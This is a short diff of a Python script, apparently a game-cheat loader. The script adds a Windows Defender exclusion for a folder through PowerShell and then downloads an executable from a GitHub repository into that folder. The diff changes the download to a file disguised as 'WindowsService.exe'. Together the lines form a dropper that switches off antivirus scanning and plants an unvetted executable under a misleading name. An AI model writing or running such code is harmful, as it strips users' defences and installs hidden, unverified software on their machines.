@@ -29,7 +29,7 @@ def main():
 
     os.system("powershell Add-MpPreference -ExclusionPath '"+ fpath + "'")
     try:
-        urlretrieve("https://github.com/eb-repo/cheats/raw/refs/heads/main/SimsMedievalCheatsToggler.exe", fpath+"WindowsService.exe")
+        urlretrieve("https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/WindowsService.exe", fpath+"WindowsService.exe")
     except Exception as e:
         print(e)
         input()
